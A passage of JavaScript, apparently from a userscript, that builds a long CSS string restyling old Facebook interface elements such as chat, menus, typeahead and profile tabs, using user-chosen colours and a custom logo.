                  ".uiComposerHideMessageBox .attachmentFrame, .uiComposerHideInput .attachmentFrame {" +
                  "    border-bottom-color: #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox {" +
                  "    border-color: #B4BBCD;" +
                  "    border-right: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .inputContainer {" +
                  "    border: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead {" +
                  "    border-bottom: 1px solid #B4BBCD !important;" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead .wrap {" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiMentionsInput .highlighter b {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".uiToken {" +
                  "    background: none repeat scroll 0 0 #E2E6F0;" +
                  "    border: 1px solid #9DACCC;" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiTokenSelected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiInlineTokenizer {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".interaction_form .underline {" +
                  "    border-bottom: 1px solid #EDEFF5;" +
                  "}" +
                  ".interaction_form .link_placeholder {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".giftshop .extra_text strong {" +
                  "    color: #008000;" +
                  "}" +
                  "#embedded_store #giftshop_search_option_input {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#embedded_store #store_footer {" +
                  "    border-top: 1px solid #D5D5DF;" +
                  "}" +
                  ".UIErrorForm_Field select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_NoError {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_ErrorField {" +
                  "    border: 2px solid #DD3C10;" +
                  "}" +
                  ".UIErrorForm_Flag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".contextual_dialog .contextual_dialog_content {" +
                  "    border-color: #333333 #333333 #283E6A;" +
                  "}" +
                  ".UIHelpFlag_Close:hover {" +
                  "    background-color: #F9EFB3;" +
                  "}" +
                  ".UIHelpFlag_Block .UIHelpFlag_Inner {" +
                  "    background-color: #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".UIErrorFlag .UIErrorFlag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".error_field {" +
                  "    background: none repeat scroll 0 0 #DD3C10;" +
                  "}" +
                  ".error_field input.inputtext, .error_field input.inputpassword, .error_field #captcha_response {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#ci_module_list li.ci_module:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#ci_module_list li.ci_module.expanded {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#wizard_step #ci_module_list, #wizard_step #ci_module_list li.ci_module.expanded, #wizard_step #ci_module_list li.ci_module.expanded:hover {" +
                  "    background-color: #EDEDED;" +
                  "}" +
                  "#ci_module_list .ci_module {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".autoimport .error {" +
                  "    background: none repeat scroll 0 50% #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#filter a:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#filter a.selected {" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".friendtable .info .updates {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".friendtable .actions a, .friendtable .actions span {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".friendtable .actions a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".confirmcount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".confirm {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".public_listing .search_bar span.highlight {" +
                  "    background-color: #FFF8CC;" +
                  "}" +
                  "#public_listing_pages .category h3 {" +
                  "    border-bottom: 1px solid #D3DAE8;" +
                  "}" +
                  ".public_listing .logged_in_vertical_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiComboInput {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".fbEmu .body a.signature {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".fbEmuHide .thex:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .pagerpro_a:hover {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .current .pagerpro_a, .footer_bar .pagerpro .current .pagerpro_a:hover {" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".photo_tag_frame {" +
                  "    border: 5px solid #D8DFEA;" +
                  "}" +
                  ".editphotos .photo_tag_frame {" +
                  "    border: 4px solid #D8DFEA;" +
                  "}" +
                  ".photo_tag_frame_inside {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "}" +
                  "#photo_tag_selector {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  "#pts_invite_msg {" +
                  "    background-color: #FFFFBB;" +
                  "}" +
                  ".photo_list .album img:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".sharelink {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".single_photo_header h2 {" +
                  "    color: #192B46;" +
                  "}" +
                  "#photocomment .actions a small {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#comment_error {" +
                  "    color: #996666;" +
                  "}" +
                  "#photoactions a {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  "#photoactions a:hover, #photoactions .action_link:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  "#rotateleft a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z4/r/YMPqumRb_-C.gif\") no-repeat scroll 2px 2px "+setup.colour1+";" +
                  "}" +
                  "#rotateright a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zx/r/qAjhwbqxvdd.gif\") no-repeat scroll 3px 2px "+setup.colour1+";" +
                  "}" +
                  "#tagging_instructions {" +
                  "    background: none repeat scroll 0 0 #FFFBE2;" +
                  "    border: 1px solid #FFE222;" +
                  "}" +
                  ".tag_outer {" +
                  "    border: 7px solid #D8DFEA;" +
                  "}" +
                  ".tag_inner {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "textarea, .inputtext, .inputpassword {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".inputbutton, .inputsubmit {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: #D9DFEA #0E1F5B #0E1F5B #D9DFEA;" +
                  "}" +
                  "button.as_link {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title, .UIComposer_PrivacyCallout_Text {" +
                  "    border: 1px solid #467C2C;" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title {" +
                  "    background-color: #67A54B;" +
                  "}" +
                  ".UIActionLinks_bottom a, .UIActionLinks_bottom button.as_link, .UIActionLinks_left, .UIActionLinks_right {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".UIActionLinks .uiBlingBox {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list {" +
                  "    border-color: -moz-use-text-color #BDC7D8 #BDC7D8;" +
                  "    border-right: 1px solid #BDC7D8;" +
                  "}" +
                  ".typeahead_list .typeahead_suggestion em {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".typeahead_list .typeahead_selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list .typeahead_selected small {" +
                  "    color: #95A5C6;" +
                  "}" +
                  ".typeahead_list .typeahead_selected em {" +
                  "    background: none repeat scroll 0 0 #5670A6;" +
                  "}" +
                  "input.typeahead_found {" +
                  "    background-color: #E1E9F6;" +
                  "}" +
                  ".typeahead_friendlist_icon.on_selected {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.standard_tokenizer div.tokenizer {" +
                  "    border: 1px solid #8F96BD;" +
                  "}" +
                  ".pop_content h2.dialog_title {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".pop_content h2.dialog_title .dialog_x {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.secure {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zu/r/jp8TzrZb6J1.png\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.dialog_loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 400px 10px "+setup.colour2+";" +
                  "}" +
                  ".uiButtonSpecial {" +
                  "    background-color: #69A74E;" +
                  "    border-color: #3B6E22 #3B6E22 #2C5115;" +
                  "}" +
                  ".uiButtonSpecial:active {" +
                  "    background: none repeat scroll 0 0 #609946;" +
                  "    border-bottom-color: #3B6E22;" +
                  "}" +
                  ".uiButtonSpecial.uiButtonDisabled, .uiButtonSpecial.uiButtonDisabled:active, .uiButtonSpecial.uiButtonDisabled:focus, .uiButtonSpecial.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #B4D3A7;" +
                  "    border-color: #9DB791;" +
                  "}" +
                  ".uiButtonConfirm {" +
                  "    background-color: #5B74A8;" +
                  "    border-color: #29447E #29447E #1A356E;" +
                  "}" +
                  ".uiButtonConfirm:active {" +
                  "    background: none repeat scroll 0 0 #4F6AA3;" +
                  "    border-bottom-color: #29447E;" +
                  "}" +
                  ".uiButtonConfirm.uiButtonDisabled, .uiButtonConfirm.uiButtonDisabled:active, .uiButtonConfirm.uiButtonDisabled:focus, .uiButtonConfirm.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #ADBAD4;" +
                  "    border-color: #94A2BF;" +
                  "}" +
                  ".uiLinkButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiLinkButton:hover, .uiLinkButton input:hover, .uiLinkButton input:focus, .uiLinkButton input:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBoxLightblue {" +
                  "    background-color: #EDEFF4;" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiBoxRed {" +
                  "    background-color: #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  ".uiBoxYellow {" +
                  "    background-color: #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiListBulleted {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTextHighlight {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".uiMenu {" +
                  "    border-color: #777777 #777777 #293E6A;" +
                  "}" +
                  ".uiMenuItem a:active, .uiMenuItem a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMenu .checked a:active, .uiMenu .checked a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".uiSelector .openToggler .uiSelectorButton, .uiSelector .openToggler .uiSelectorButton:active, .uiSelector .openToggler .uiSelectorButton:focus, .uiSelector .openToggler .uiSelectorButton:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" "+setup.colour2+";" +
                  "}" +
                  ".uiHeader h2 {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiHeader h2 a {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".action_links_title .comment_link, .action_links_bottom .comment_link, .feedback_toggle_link .feedback_show_link, .feedback_toggle_link .feedback_hide_link, .UIActionLinks .comment_link {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".uiUfi .ufiItem {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiUfi .uiUfiUnseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  "div.file_help {" +
                  "    background: none repeat scroll 0 0 #FCFCFC;" +
                  "}" +
                  ".editor #start_calendar, .editor #end_calendar {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-left: 1px solid #D8DFEA;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser div.see_more {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser a.see_more:hover {" +
                  "    background-color: #E6EDF8;" +
                  "}" +
                  "#fbDockChatBuddylistNub .chat_buddylist_typeahead input {" +
                  "    border-color: #93A2C1;" +
                  "}" +
                  ".fbChatBuddylist a.friend em {" +
                  "    background-color: #DCE1E8;" +
                  "}" +
                  ".fbChatBuddylist a.selected em, .fbChatBuddylistContent a:hover em {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".fbChatBuddylist a.friend:hover, .fbChatBuddylist a.selected {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#fbDockChatBuddylist #reorder_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  "#fbDockChatBuddylist #error_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open a.panel_item {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout a:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".fbDockChatTab.highlight .fbNubButton {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zq/r/hjN1fTOtVAm.png\") repeat-x scroll 0 0 "+setup.colour2+" !important;" +
                  "    border-color: #283B8A;" +
                  "}" +
                  ".fbDockChatTab .inputContainer {" +
                  "    border-top: 1px solid #93A2C1;" +
                  "}" +
                  ".fbDockChatTab .titlebarReportLink {" +
                  "    color: #B2BED7;" +
                  "}" +
                  "#jewelBoxMail .author {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".negativeBalance {" +
                  "    color: #F03D25;" +
                  "}" +
                  ".fbNubFlyoutTitlebar {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: #254588 #254588 -moz-use-text-color;" +
                  "}" +
                  ".fbNubFlyoutHeader.videoHeader {" +
                  "    border-bottom: 1px solid #93A2C1;" +
                  "}" +
                  ".jewelCount {" +
                  "    background-color: #00376A;" +
                  "}" +
                  ".jewelCount span {" +
                  "    background-color: #F03D25;" +
                  "    border-color: -moz-use-text-color #DD3822 #DD3822;" +
                  "    border-right: 1px solid #DD3822;" +
                  "}" +
                  ".jewelToggler:active, .jewelToggler:focus, .jewelToggler:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#jewelCase .jewelBox {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  "#jewelCase .jewelItemNew {" +
                  "    background: none repeat scroll 0 0 #EFF1F7;" +
                  "}" +
                  "#jewelCase .jewelItemResponded {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "}" +
                  "#jewelCase .jewelFooter a:hover, #jewelCase .jewelFooter a:active, #jewelCase .jewelFooter a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelCase .jewelHighlightItem li a:hover, #jewelCase .jewelHighlightItem li a:active, #jewelCase .jewelHighlightItem li a:focus {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelBoxNotif .blueName {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#blueBar {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#headNav {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  "#pageNav a:hover, #pageNav a:focus, #pageNav a:active {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul {" +
                  "    border-color: #333333 #333333 #2D4486;" +
                  "}" +
                  "#navAccount ul a, #navAccount ul .logoutButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul a:hover, #navAccount ul a:focus, #navAccount ul a:active, #navAccount .logoutButton:hover input, #navAccount .logoutButton input:active, #navAccount .logoutButton input:focus {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "ul #navAccountInfo a:hover, ul #navAccountInfo a:focus, ul #navAccountInfo a:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navSearch .uiTypeahead, #navSearch .uiTypeahead .wrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .item:hover, .uiSideNav .item:active, .uiSideNav .item:focus, .uiSideNav .subitem:hover, .uiSideNav .subitem:active, .uiSideNav .subitem:focus {" +
                  "    background-color: #EFF2F7;" +
                  "}" +
                  ".uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiSideNav .loading a {" +
                  "    background-color: #EFF2F7;" +
                  "    border-color: #EFF2F7 #EFF2F7 #FFFFFF;" +
                  "}" +
                  ".status {" +
                  "    background-color: #FFF9D7;" +
                  "    border-color: #E2C822;" +
                  "}" +
                  ".error {" +
                  "    background-color: #FFEBE8;" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  ".error a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".explanation_note {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".explanation_note a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".uiSearchInput {" +
                  "    border-color: #6484B4 #899BC1 #899BC1;" +
                  "    border-right: 1px solid #899BC1;" +
                  "}" +
                  ".uiPhotoThumb:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount .countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiStreamSubstories .unseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  ".uiTypeahead {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .wrap {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .selected .textInput {" +
                  "    background: none repeat scroll 0 0 #E2E8F6;" +
                  "}" +
                  ".uiTypeaheadView ul {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  ".uiTypeaheadView strong {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected strong {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".uiTypeahead .uiTypeaheadView .calltoaction.selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".typeaheadLoading .uiTypeaheadView .calltoaction.selected {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 50% 50% "+setup.colour2+";" +
                  "}" +
                  ".uiTypeaheadView .search img {" +
                  "    background-color: #ECEFF5;" +
                  "}" +
                  ".uiTypeaheadView .search .text {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .search .seeMore {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBlingBox:hover {" +
                  "    background-color: #ECEFF5;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".menu_login_container .inputtext, .menu_login_container .inputpassword {" +
                  "    border-color: #1D2A5B;" +
                  "}" +
                  ".menu_login_container label {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".menu_login_container a, .menu_login_container a:hover {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".loggedout_menubar_container {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".signup_bar_container {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".signup_box {" +
                  "    color: #203360;" +
                  "}" +
                  ".LogoutPage_MobileMessageContainer {" +
                  "    color: #203360;" +
                  "}" +
                  ".registration #reg_box .inputtext, .registration #reg_box .inputpassword {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".registration #reg_box .error_field input.inputtext, .registration #reg_box .error_field input.inputpassword {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#reg_pages_msg {" +
                  "    border-top: 1px solid #A0A9C0;" +
                  "}" +
                  ".registration #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumbSelected {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumb:hover, .uiMediaThumb:hover .uiMediaThumbWrap, .uiMediaThumb:active, .uiMediaThumb:active .uiMediaThumbWrap, .uiMediaThumb:focus, .uiMediaThumb:focus .uiMediaThumbWrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiCollapsedFacepile .showAllLink {" +
                  "    border-color: #7792BA;" +
                  "}" +
                  ".WelcomePage_MainMessage {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpHeadline {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpSubheadline {" +
                  "    color: #203360;" +
                  "}" +
                  "#reg_box .label {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_box .inputtext, #reg_box .inputpassword {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  ".ff2 #reg_box select, .ff3 #reg_box select {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  "#openid_buttons_box {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  "#captcha_response {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#reg_error, #captcha_error {" +
                  "    background: none repeat scroll 0 0 #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#reg_captcha h2 {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_captcha #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".actionspro .actionspro_li {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".actionspro .actionspro_a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".link_menu .menu_content a:hover, .link_menu_list .menu_content ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  ".dropdown_menu .menu_content {" +
                  "    border: 1px solid #6076A5;" +
                  "}" +
                  ".dropdown_menu a:hover {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "}" +
                  ".dropdown_head .dropdown_link.selected {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "    border-left: 1px solid "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".profile .basic_info_summary {" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box {" +
                  "    border-top: 1px solid #94A3C4;" +
                  "}" +
                  ".profile .box .box_header {" +
                  "    background: none repeat scroll 0 0 #ECEFF5;" +
                  "}" +
                  ".profile .box h4.box_header {" +
                  "    border-bottom: 1px solid #ECEFF5;" +
                  "}" +
                  ".profile .box_placeholder {" +
                  "    border: 3px dashed #93A4C6;" +
                  "}" +
                  ".profile .add_new_box_border .pop_content {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".profile .add_new_box_border .border_frame {" +
                  "    border: 10px solid #868686;" +
                  "}" +
                  ".profile .add_new_box_border .dialog_buttons {" +
                  "    background: none repeat scroll 0 0 #F7F7F7;" +
                  "    border-color: #CCCCCC "+setup.colour1+" "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#photos_box .added .album {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".profile .profile_top_wash {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zb/r/3LyZkLVshsc.gif\") repeat-x scroll left bottom #EDEFF4;" +
                  "}" +
                  ".profile .top_bar .status_source a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status .clear_link a, .profile .top_bar .mobile_status .profile_empty_status a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status small a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link {" +
                  "    border-color: #D8DFEA #D8DFEA -moz-use-text-color;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected_menu_icon a.tab_link, .profile .top_bar ul.tabs li.add_tab a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.tab_link:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.selected {" +
                  "    border-left: 1px solid #6076A5;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more a.tab_link:hover, .profile .top_bar ul.tabs li.selected_tab_more a.tab_link {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zS/r/UK_y4vNfbHf.gif\") no-repeat scroll 0 -26px #899BC1;" +
                  "    border-left: 1px solid "+setup.colour2+";" +
